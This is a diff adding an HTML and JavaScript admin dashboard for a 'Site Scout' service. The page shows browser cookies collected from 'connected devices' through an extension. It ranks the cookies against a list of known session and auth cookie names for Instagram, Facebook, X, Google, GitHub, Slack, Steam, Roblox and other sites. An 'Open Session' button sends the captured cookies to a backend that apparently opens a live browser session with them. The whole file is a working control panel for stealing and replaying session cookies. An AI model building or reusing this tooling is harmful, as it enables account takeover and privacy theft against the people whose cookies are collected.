@@ -1,0 +1,286 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Admin — Site Scout</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0b0f1a; --surface: #111827; --border: #1e2d42;
+      --text: #e2e8f0; --muted: #7a8fa8; --dim: #3d5068;
+      --cyan: #67e8f9; --green: #86efac; --red: #f87171; --yellow: #fcd34d; --purple: #a78bfa;
+    }
+    body { background: var(--bg); color: var(--text); font: 14px/1.5 system-ui, sans-serif; min-height: 100vh; }
+    header { padding: 16px 24px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+    .brand { font: 700 15px system-ui; color: var(--cyan); letter-spacing: .04em; }
+    .badge { font-size: 10px; padding: 2px 8px; border-radius: 4px; background: #f8717118; border: 1px solid #f8717144; color: var(--red); font-weight: 700; letter-spacing: .06em; }
+    #refresh-btn { font: 600 12px system-ui; padding: 6px 14px; border-radius: 7px; background: var(--surface); border: 1px solid var(--border); color: var(--muted); cursor: pointer; }
+    #refresh-btn:hover { color: var(--text); border-color: var(--cyan); }
+    main { max-width: 960px; margin: 0 auto; padding: 24px 16px; }
+    .stats-row { display: flex; gap: 12px; margin-bottom: 24px; flex-wrap: wrap; }
+    .stat { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 14px 18px; flex: 1; min-width: 120px; }
+    .stat-val { font: 700 24px system-ui; color: var(--cyan); }
+    .stat-label { font-size: 11px; color: var(--muted); margin-top: 2px; }
+    #device-list { display: flex; flex-direction: column; gap: 10px; }
+    .device-card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+    .device-head { padding: 14px 16px; display: flex; align-items: center; gap: 12px; cursor: pointer; user-select: none; }
+    .device-head:hover { background: #ffffff05; }
+    .device-icon { font-size: 22px; flex-shrink: 0; }
+    .device-meta { flex: 1; min-width: 0; }
+    .device-name { font: 600 13px system-ui; color: var(--text); }
+    .device-sub { font-size: 11px; color: var(--muted); margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .device-right { display: flex; flex-direction: column; align-items: flex-end; gap: 4px; flex-shrink: 0; }
+    .device-time { font-size: 10px; color: var(--dim); }
+    .ck-count { font-size: 11px; padding: 2px 8px; border-radius: 4px; background: #67e8f918; border: 1px solid #67e8f933; color: var(--cyan); font-weight: 700; }
+    .chevron { font-size: 10px; color: var(--dim); transition: transform .2s; }
+    .device-card.open .chevron { transform: rotate(180deg); }
+    .device-body { display: none; border-top: 1px solid var(--border); padding: 12px 16px; }
+    .device-card.open .device-body { display: block; }
+    .domain-row { font-size: 11px; color: var(--muted); margin-bottom: 10px; }
+    .domain-row span { color: var(--cyan); font-family: monospace; }
+    .cookie-table { width: 100%; border-collapse: collapse; font-size: 11px; }
+    .cookie-table th { text-align: left; color: var(--dim); font-weight: 600; padding: 4px 8px; border-bottom: 1px solid var(--border); letter-spacing: .06em; font-size: 10px; text-transform: uppercase; }
+    .cookie-table td { padding: 5px 8px; border-bottom: 1px solid #1e2d4240; vertical-align: top; }
+    .cookie-table tr:last-child td { border-bottom: none; }
+    .ck-name { font-family: monospace; color: var(--text); font-weight: 600; }
+    .ck-val { font-family: monospace; color: var(--muted); word-break: break-all; max-width: 260px; }
+    .ck-val.full { max-width: none; white-space: pre-wrap; }
+    .ck-expand { font-size: 10px; color: var(--cyan); cursor: pointer; margin-left: 4px; user-select: none; }
+    .ck-badge { font-size: 9px; padding: 1px 5px; border-radius: 3px; font-weight: 700; white-space: nowrap; }
+    .badge-key { background: #67e8f918; border: 1px solid #67e8f933; color: var(--cyan); }
+    .badge-auth { background: #a78bfa18; border: 1px solid #a78bfa33; color: var(--purple); }
+    .badge-other { background: #3d506818; border: 1px solid #3d506833; color: var(--dim); }
+    .history-row { font-size: 11px; color: var(--muted); padding: 4px 0; border-bottom: 1px solid #1e2d4240; display: flex; gap: 12px; }
+    .history-row:last-child { border-bottom: none; }
+    .history-time { color: var(--dim); min-width: 160px; flex-shrink: 0; }
+    .tabs { display: flex; gap: 4px; margin-bottom: 10px; }
+    .tab { font: 600 11px system-ui; padding: 4px 10px; border-radius: 5px; border: 1px solid var(--border); color: var(--muted); cursor: pointer; background: none; }
+    .tab.active { background: #67e8f918; border-color: #67e8f944; color: var(--cyan); }
+    .first-seen { font-size: 10px; color: var(--dim); margin-bottom: 8px; }
+    .send-btn { font: 600 11px system-ui; padding: 5px 12px; border-radius: 6px; background: #67e8f910; border: 1px solid #67e8f933; color: var(--cyan); cursor: pointer; margin-top: 10px; }
+    .send-btn:hover { background: #67e8f920; }
+    .send-btn.sent { color: var(--green); border-color: #86efac33; background: #86efac10; cursor: default; }
+  </style>
+</head>
+<body>
+<header>
+  <div class="brand">⚡ Site Scout — Admin</div>
+  <div style="display:flex;align-items:center;gap:10px">
+    <span class="badge">ADMIN</span>
+    <button id="refresh-btn">↺ Refresh</button>
+  </div>
+</header>
+<main>
+  <div class="stats-row">
+    <div class="stat"><div class="stat-val" id="stat-devices">—</div><div class="stat-label">Connected devices</div></div>
+    <div class="stat"><div class="stat-val" id="stat-cookies">—</div><div class="stat-label">Total cookies seen</div></div>
+    <div class="stat"><div class="stat-val" id="stat-domains">—</div><div class="stat-label">Unique domains</div></div>
+  </div>
+  <div id="device-list"><div class="empty">Loading…</div></div>
+</main>
+<script>
+const token = new URLSearchParams(location.search).get('t') || '';
+
+const PLATFORMS = [
+  { name:"Instagram", domain:"instagram.com", keys:["sessionid","csrftoken","ds_user_id","rur","mid","ig_did"] },
+  { name:"Facebook", domain:"facebook.com", keys:["c_user","xs","fr","datr","sb","wd"] },
+  { name:"Twitter / X", domain:"twitter.com", keys:["auth_token","ct0","twid","kdt","att"] },
+  { name:"Twitter / X", domain:"x.com", keys:["auth_token","ct0","twid","kdt","att"] },
+  { name:"TikTok", domain:"tiktok.com", keys:["sessionid","sessionid_ss","sid_guard","uid_tt","uid_tt_ss","csrf_session_id","tt_csrf_token","tt_chain_token"] },
+  { name:"YouTube", domain:"youtube.com", keys:["SID","HSID","SSID","APISID","SAPISID","LOGIN_INFO","PREF","__Secure-1PSID","__Secure-3PSID"] },
+  { name:"Google", domain:"google.com", keys:["SID","HSID","SSID","APISID","SAPISID","NID","__Secure-1PSID","__Secure-3PSID","SIDCC"] },
+  { name:"LinkedIn", domain:"linkedin.com", keys:["li_at","JSESSIONID","liap","li_gc","bcookie","bscookie"] },
+  { name:"Reddit", domain:"reddit.com", keys:["reddit_session","token_v2","csv","edgebucket","loid"] },
+  { name:"Netflix", domain:"netflix.com", keys:["NetflixId","SecureNetflixId","memclid","nfvdid"] },
+  { name:"GitHub", domain:"github.com", keys:["user_session","__Host-user_session_same_site","dotcom_user","logged_in","_gh_sess"] },
+  { name:"Discord", domain:"discord.com", keys:["__dcfduid","__sdcfduid","__cfruid","locale"] },
+  { name:"Slack", domain:"slack.com", keys:["d","d-s","b","x","lc"] },
+  { name:"Steam", domain:"steampowered.com", keys:["steamLoginSecure","sessionid","steamCountry"] },
+  { name:"Roblox", domain:"roblox.com", keys:[".ROBLOSECURITY","RBXEventTrackerV2","GuestData"] },
+];
+const AUTH_RE = /session|sess|token|auth|login|logged|user_id|uid|account|jwt|access|refresh|csrf|xsrf|remember|persist|bearer|secure|credential|identity|profile/i;
+const NOISE_RE = /^(_ga$|_gid$|_fbp$|_fbc$|_gcl_|__utm|_hjid|_hjSession|amplitude|mixpanel|intercom|drift|hotjar|ab_|experiment|variant|consent|gdpr|cookie_notice|cc_|CookieConsent|banner|promo|_pin_unauth)/i;
+
+function matchPlatform(domain) {
+  const clean = (domain || '').replace(/^\./, '');
+  return PLATFORMS.find(p => clean === p.domain || clean.endsWith('.' + p.domain)) || null;
+}
+function classify(name, platform) {
+  if (platform && platform.keys.includes(name)) return 'key';
+  if (NOISE_RE.test(name)) return 'noise';
+  if (AUTH_RE.test(name)) return 'auth';
+  return 'other';
+}
+function osIcon(os) {
+  if (/iphone|ipad/i.test(os)) return '📱';
+  if (/mac/i.test(os)) return '🍎';
+  if (/android/i.test(os)) return '📱';
+  if (/win/i.test(os)) return '🖥️';
+  if (/linux/i.test(os)) return '🐧';
+  return '💻';
+}
+function timeAgo(ts) {
+  const s = Math.floor((Date.now() - ts) / 1000);
+  if (s < 60) return s + 's ago';
+  if (s < 3600) return Math.floor(s/60) + 'm ago';
+  if (s < 86400) return Math.floor(s/3600) + 'h ago';
+  return Math.floor(s/86400) + 'd ago';
+}
+function fullDate(ts) {
+  return new Date(ts).toLocaleString();
+}
+
+function parseCookies(device) {
+  if (device.cookieObjects && device.cookieObjects.length) return device.cookieObjects;
+  if (!device.cookies) return [];
+  return device.cookies.split(';').map(p => {
+    const eq = p.indexOf('=');
+    if (eq < 1) return null;
+    return { name: p.slice(0, eq).trim(), value: p.slice(eq + 1).trim(), domain: device.domain };
+  }).filter(Boolean);
+}
+
+function render(devices) {
+  const list = document.getElementById('device-list');
+  if (!devices.length) { list.innerHTML = '<div class="empty">No devices have connected yet.<br>Open the extension on any browser and send cookies to Site Scout.</div>'; return; }
+
+  const totalCookies = devices.reduce((s, d) => s + parseCookies(d).length, 0);
+  const domains = new Set(devices.map(d => d.domain).filter(Boolean));
+  document.getElementById('stat-devices').textContent = devices.length;
+  document.getElementById('stat-cookies').textContent = totalCookies;
+  document.getElementById('stat-domains').textContent = domains.size;
+
+  list.innerHTML = devices.map((d, i) => {
+    const cookies = parseCookies(d);
+    const platform = matchPlatform(d.domain);
+    const rows = cookies.map((c, ci) => {
+      const cls = classify(c.name, platform);
+      const badge = cls === 'key' ? '<span class="ck-badge badge-key">KEY</span>'
+        : cls === 'auth' ? '<span class="ck-badge badge-auth">AUTH</span>'
+        : cls === 'noise' ? '<span class="ck-badge badge-other">NOISE</span>'
+        : '<span class="ck-badge badge-other">—</span>';
+      const fullVal = c.value || '';
+      const shortVal = fullVal.length > 60 ? fullVal.slice(0, 60) + '…' : fullVal;
+      const expandBtn = fullVal.length > 60 ? `<span class="ck-expand" onclick="expandVal(${i},${ci})">▼ show full</span>` : '';
+      return `<tr><td class="ck-name">${esc(c.name)}</td><td>${badge}</td><td class="ck-val" id="ckv-${i}-${ci}">${esc(shortVal)}${expandBtn}</td></tr>`;
+    }).join('');
+
+    const historyRows = (d.history || []).map(h =>
+      `<div class="history-row"><span class="history-time">${fullDate(h.seenAt)}</span><span>${esc(h.domain || '—')}</span><span>${h.cookieCount} cookie(s)</span></div>`
+    ).join('') || '<div style="font-size:12px;color:var(--dim)">No history yet.</div>';
+
+    return `<div class="device-card" id="dc-${i}">
+      <div class="device-head" onclick="toggle(${i})">
+        <div class="device-icon">${osIcon(d.os)}</div>
+        <div class="device-meta">
+          <div class="device-name">${esc(d.name)}</div>
+          <div class="device-sub">${esc(d.os)} · ${esc(d.browser)} · ${esc(d.domain || 'no domain')}</div>
+        </div>
+        <div class="device-right">
+          <span class="device-time" title="${fullDate(d.seenAt)}">${timeAgo(d.seenAt)}</span>
+          <span class="ck-count">${cookies.length} cookies</span>
+        </div>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="device-body">
+        <div class="first-seen">First seen: ${fullDate(d.firstSeenAt || d.seenAt)} · Last seen: ${fullDate(d.seenAt)}</div>
+        <div class="domain-row">Domain: <span>${esc(d.domain || '—')}</span></div>
+        <div class="tabs">
+          <button class="tab active" onclick="showTab(${i},'cookies',this)">🍪 Cookies (${cookies.length})</button>
+          <button class="tab" onclick="showTab(${i},'history',this)">🕓 History (${(d.history||[]).length})</button>
+        </div>
+        <div id="tab-cookies-${i}">
+          ${cookies.length ? `<table class="cookie-table"><thead><tr><th>Name</th><th>Role</th><th>Value</th></tr></thead><tbody>${rows}</tbody></table>` : '<div style="font-size:12px;color:var(--dim)">No cookies captured.</div>'}
+        </div>
+        <div id="tab-history-${i}" style="display:none">${historyRows}</div>
+        <button class="send-btn" onclick="sendToSession(${i}, this)">▶ Open Session</button>
+        <div class="session-log" id="slog-${i}" style="display:none;margin-top:10px;background:#0b0f1a;border:1px solid var(--border);border-radius:8px;padding:10px;font:12px/1.6 monospace;max-height:180px;overflow-y:auto;color:var(--muted)"></div>
+      </div>
+    </div>`;
+  }).join('');
+
+  window._adminDevices = devices;
+}
+
+function toggle(i) {
+  document.getElementById('dc-' + i).classList.toggle('open');
+}
+
+function expandVal(i, ci) {
+  const d = window._adminDevices[i];
+  const cookies = parseCookies(d);
+  const c = cookies[ci];
+  const el = document.getElementById(`ckv-${i}-${ci}`);
+  if (el) { el.textContent = c.value || ''; el.classList.add('full'); }
+}
+
+function showTab(i, tab, btn) {
+  document.getElementById(`tab-cookies-${i}`).style.display = tab === 'cookies' ? '' : 'none';
+  document.getElementById(`tab-history-${i}`).style.display = tab === 'history' ? '' : 'none';
+  btn.closest('.tabs').querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  btn.classList.add('active');
+}
+
+function sendToSession(i, btn) {
+  const d = window._adminDevices[i];
+  const cookies = parseCookies(d);
+  const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+  const url = d.domain ? 'https://' + d.domain.replace(/^\./, '') : null;
+  if (!url) { alert('No domain for this device.'); return; }
+  btn.disabled = true; btn.textContent = 'Launching…';
+  const log = document.getElementById('slog-' + i);
+  log.style.display = 'block'; log.innerHTML = '';
+  const addLog = (text, ok) => {
+    log.insertAdjacentHTML('beforeend', `<div style="color:${ok === false ? 'var(--yellow)' : 'var(--green)'}">${esc(text)}</div>`);
+    log.scrollTop = log.scrollHeight;
+  };
+  fetch('/api/session', {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ url, cookies: cookieStr, cookieObjects: d.cookieObjects || [] }),
+  }).then(async res => {
+    if (!res.ok) { const e = await res.json().catch(() => ({})); addLog('Error: ' + (e.error || res.status), false); btn.disabled = false; btn.textContent = '▶ Open Session'; return; }
+    const reader = res.body.getReader();
+    const dec = new TextDecoder();
+    let buf = '';
+    while (true) {
+      const { value, done } = await reader.read();
+      if (done) break;
+      buf += dec.decode(value, { stream: true });
+      const lines = buf.split('\n'); buf = lines.pop();
+      for (const line of lines) {
+        if (!line.trim()) continue;
+        const msg = JSON.parse(line);
+        if (msg.type === 'log') addLog(msg.text, msg.ok !== false);
+        else if (msg.type === 'ready') {
+          addLog(msg.warning ? '⚠ Redirected to login — cookies may be expired' : '✓ Browser open — ' + (msg.pageTitle || ''), msg.warning ? false : true);
+          btn.textContent = '■ Session Active'; btn.style.color = 'var(--green)';
+        } else if (msg.type === 'closed') {
+          addLog('Browser closed.', false);
+          btn.disabled = false; btn.textContent = '▶ Open Session'; btn.style.color = '';
+        }
+      }
+    }
+  }).catch(e => { addLog('Error: ' + e.message, false); btn.disabled = false; btn.textContent = '▶ Open Session'; });
+}
+
+function esc(s) {
+  return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+async function load() {
+  try {
+    const r = await fetch('/api/admin/devices?t=' + encodeURIComponent(token));
+    if (r.status === 403) { document.getElementById('device-list').innerHTML = '<div class="empty">⛔ Invalid admin token.</div>'; return; }
+    const { devices } = await r.json();
+    render(devices);
+  } catch { document.getElementById('device-list').innerHTML = '<div class="empty">Failed to load.</div>'; }
+}
+
+document.getElementById('refresh-btn').addEventListener('click', load);
+load();
+setInterval(load, 15_000);
+</script>
+</body>
+</html>
